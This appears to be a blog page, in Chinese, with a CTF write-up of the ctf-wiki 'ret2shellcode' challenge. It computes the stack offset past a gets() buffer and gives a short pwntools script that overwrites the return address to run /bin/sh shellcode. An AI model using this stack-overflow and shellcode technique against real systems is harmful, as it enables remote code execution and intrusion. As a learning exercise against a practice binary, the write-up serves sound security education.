@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="一道 ctf-wiki 上的题目，题目地址：ret2shellcode 直接将断点断在 gets危险函数处，地址为0x08048593，  我们由下图可以观察到，我们输入的内容的地址是相对于esp而言的esp+0x1c，我们需要以算出相对于 ebp的偏移，而现在已知EBP=0xffffd698、ESP=0xffffd610  因此，由下 picture 1可以得到，输入相对于ebp的偏移是0x6c">
+<meta name="keywords" content="pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ret2shellcode">
+<meta property="og:url" content="http://yoursite.com/2019/03/26/ret2shellcode/index.html">
+<meta property="og:site_name" content="ConzeHsu&#39;s blog">
+<meta property="og:description" content="一道 ctf-wiki 上的题目，题目地址：ret2shellcode 直接将断点断在 gets危险函数处，地址为0x08048593，  我们由下图可以观察到，我们输入的内容的地址是相对于esp而言的esp+0x1c，我们需要以算出相对于 ebp的偏移，而现在已知EBP=0xffffd698、ESP=0xffffd610  因此，由下 picture 1可以得到，输入相对于ebp的偏移是0x6c">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://ww1.sinaimg.cn/mw690/007c8ISGly1g1g8eqa1maj30jf0f40ub.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/mw690/007c8ISGly1g1g8qdui38j30je0ghdhj.jpg">
+<meta property="og:updated_time" content="2019-03-26T07:59:07.533Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="ret2shellcode">
+<meta name="twitter:description" content="一道 ctf-wiki 上的题目，题目地址：ret2shellcode 直接将断点断在 gets危险函数处，地址为0x08048593，  我们由下图可以观察到，我们输入的内容的地址是相对于esp而言的esp+0x1c，我们需要以算出相对于 ebp的偏移，而现在已知EBP=0xffffd698、ESP=0xffffd610  因此，由下 picture 1可以得到，输入相对于ebp的偏移是0x6c">
+<meta name="twitter:image" content="http://ww1.sinaimg.cn/mw690/007c8ISGly1g1g8eqa1maj30jf0f40ub.jpg">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>ret2shellcode</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+        
+      </ul>
+    </span>
+    <br>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2019/03/20/input/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous</span>
+      <span id="i-next" class="info" style="display:none;">Next</span>
+      <span id="i-top" class="info" style="display:none;">Top</span>
+      <span id="i-share" class="info" style="display:none;">Share</span>
+    </span>
+    <br>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/03/26/ret2shellcode/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/03/26/ret2shellcode/&text=ret2shellcode"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/03/26/ret2shellcode/&title=ret2shellcode"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Notes"><span class="toc-number">1.</span> <span class="toc-text">Notes</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        ret2shellcode
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+        <span itemprop="name">ConzeHsu's blog</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-03-26T07:15:18.000Z" itemprop="datePublished">2019-03-26</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/pwn/">pwn</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>一道 ctf-wiki 上的题目，题目地址：<a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode" target="_blank" rel="noopener">ret2shellcode</a></p>
+<p>直接将断点断在 <code>gets</code>危险函数处，地址为<code>0x08048593</code>，</p>
+<p><img src="http://ww1.sinaimg.cn/mw690/007c8ISGly1g1g8eqa1maj30jf0f40ub.jpg" alt=""></p>
+<p>我们由下图可以观察到，我们输入的内容的地址是相对于esp而言的<code>esp+0x1c</code>，我们需要以算出相对于 <code>ebp</code>的偏移，而现在已知<code>EBP=0xffffd698</code>、<code>ESP=0xffffd610</code></p>
+<p><img src="http://ww1.sinaimg.cn/mw690/007c8ISGly1g1g8qdui38j30je0ghdhj.jpg" alt=""></p>
+<p>因此，由下 <code>picture 1</code>可以得到，输入相对于ebp的偏移是<code>0x6c</code>，即需要填充的大小为<code>0x6c+0x04</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">											+---------------+</span><br><span class="line">											|	 retaddr	|</span><br><span class="line">											+---------------+</span><br><span class="line">               								|	 saved ebp	|</span><br><span class="line">0xffff698  +---------------+			  ebp	+---------------+</span><br><span class="line">		|				|					|				|</span><br><span class="line">		|				|					|	 padding	|</span><br><span class="line">		|	len=0x6c	|					|				|</span><br><span class="line">		|				|					|				|</span><br><span class="line">		|				|					+---------------+</span><br><span class="line">0xffffd62c	+---------------+					|				|</span><br><span class="line">		|	len=0x1c	|					|	shellcode	|</span><br><span class="line">		|				|					|				|</span><br><span class="line">0xffffd610 +---------------|			-0x6c	+---------------+</span><br><span class="line">			picture 1                           picture 2</span><br></pre></td></tr></table></figure>
+<p>由<code>picture 2</code>可以得出以下的题解。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">'./ret2shellcode'</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())	<span class="comment">#生成shellcode代码</span></span><br><span class="line">buf2_addr = <span class="number">0x0804A080</span>		<span class="comment">#调用strncpy需要拷贝进的buf地址</span></span><br><span class="line">payload=shellcode+<span class="string">'a'</span>*(<span class="number">0x6c</span>+<span class="number">0x04</span>-len(shellcode))+p32(buf2_addr)</span><br><span class="line"><span class="comment">#payload = shellcode.ljust(112, 'A')+p32(buf2_addr) #与上一行等效</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="Notes"><a href="#Notes" class="headerlink" title="Notes"></a>Notes</h2><blockquote>
+<p>开始对原网页的 <code>sh.sendline(shellcode.ljust(112, &#39;A&#39;) + p32(buf2_addr))</code>理解不了，其含义即为用shellcode和’A’填充满112个字符。</p>
+</blockquote>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Notes"><span class="toc-number">1.</span> <span class="toc-text">Notes</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/03/26/ret2shellcode/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/03/26/ret2shellcode/&text=ret2shellcode"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/03/26/ret2shellcode/&title=ret2shellcode"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> Toc</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 ConzeHsu
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+    <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "https://hm.baidu.com/hm.js?72858d4dd5377337e085cc97ce6290a4";
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+<!-- Disqus Comments -->
+
+
